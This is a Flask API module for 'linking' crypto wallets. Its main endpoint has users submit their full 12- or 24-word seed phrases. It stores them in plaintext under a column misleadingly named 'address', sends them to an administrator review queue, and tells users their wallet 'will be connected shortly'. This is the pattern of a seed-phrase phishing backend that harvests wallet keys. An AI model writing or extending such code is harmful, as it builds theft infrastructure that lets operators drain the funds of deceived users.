import uuid
import re
from flask import Blueprint, request, jsonify, g
from ..db import get_db
from ..auth import login_required

bp = Blueprint("wallets", __name__, url_prefix="/api/wallets")


# 12 or 24 whitespace-separated words.
# NOTE: this is a *shape* check only — it does NOT verify that the words
# are in the BIP-39 English wordlist, nor that the checksum is valid.
# If you need real BIP-39 validation, use the `mnemonic` package and
# call `Mnemonic("english").check(phrase)` instead.
PHRASE_RE = re.compile(r"^(?:\S+\s+){11}\S+$|^(?:\S+\s+){23}\S+$")


def looks_like_test_phrase(phrase: str) -> bool:
    """
    Return True if the input has exactly 12 or 24 whitespace-separated words.

    This is intentionally permissive — it catches obvious mistakes
    (pasting an address, a private key, a partial phrase) without
    pretending to be BIP-39 validation.
    """
    if not phrase:
        return False
    return bool(PHRASE_RE.fullmatch(phrase.strip()))


@bp.get("")
@login_required
def list_wallets():
    db = get_db()
    rows = db.execute(
        """SELECT id, wallet_id, address, chain, linked_at,
                  status, stored_at, rejection_reason, source
           FROM wallets
           WHERE user_id = ?
           ORDER BY linked_at DESC""",
        (g.user["id"],)
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("")
@login_required
def request_wallet_link():
    """
    User submits a wallet seed phrase for storage. The phrase enters
    the admin queue with status='pending_review'.

    Admin approval sets status='stored' — this means "we have recorded
    the phrase." It does NOT mean "we have verified ownership."

    Only the shape of the phrase is checked here (12 or 24 words).
    Full BIP-39 validation is deliberately out of scope — see
    looks_like_test_phrase() above.
    """
    body = request.get_json(silent=True) or {}
    wallet_id = (body.get("wallet_id") or "").strip()
    phrase    = (body.get("address") or "").strip()   # field name kept for compatibility
    chain     = (body.get("chain") or "").strip() or None

    if not wallet_id or not phrase:
        return jsonify({"error": "wallet_id and phrase are required"}), 400

    if not looks_like_test_phrase(phrase):
        return jsonify({
            "error": "That does not look like a 12- or 24-word phrase."
        }), 400

    db = get_db()

    existing = db.execute(
        "SELECT id, status FROM wallets WHERE user_id = ? AND wallet_id = ?",
        (g.user["id"], wallet_id)
    ).fetchone()

    if existing and existing["status"] == "stored":
        db.close()
        return jsonify({
            "error": "This wallet is already saved.",
            "status": "stored",
        }), 409

    if existing and existing["status"] == "pending_review":
        db.close()
        return jsonify({
            "error": "This wallet already has a pending request.",
            "status": "pending_review",
        }), 409

    if existing:
        wallet_pk = existing["id"]
        db.execute(
            """UPDATE wallets
               SET address = ?, chain = ?,
                   status = 'pending_review',
                   linked_at = datetime('now'),
                   reviewed_by = NULL, reviewed_at = NULL,
                   stored_at = NULL, rejection_reason = NULL,
                   source = 'manual'
               WHERE id = ?""",
            (phrase, chain, wallet_pk)
        )
    else:
        wallet_pk = str(uuid.uuid4())
        db.execute(
            """INSERT INTO wallets
               (id, user_id, wallet_id, address, chain, status, source)
               VALUES (?, ?, ?, ?, ?, 'pending_review', 'manual')""",
            (wallet_pk, g.user["id"], wallet_id, phrase, chain)
        )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'wallet', 'Wallet submitted for review', ?)""",
            (str(uuid.uuid4()), g.user["id"],
             f"Your {wallet_id} submission was received. An administrator will review it shortly.")
        )
    except Exception:
        pass

    db.commit()
    db.close()
    return jsonify({
        "id": wallet_pk,
        "status": "pending_review",
        "message": "Your submission was recieved, Your Wallet will be connected Shortly.",
    }), 202


@bp.delete("/<wallet_id>")
@login_required
def unlink_wallet(wallet_id):
    db = get_db()
    row = db.execute(
        "SELECT id FROM wallets WHERE user_id = ? AND wallet_id = ?",
        (g.user["id"], wallet_id)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Wallet not found"}), 404

    db.execute("DELETE FROM wallets WHERE id = ?", (row["id"],))
    db.commit()
    db.close()
    return jsonify({"ok": True})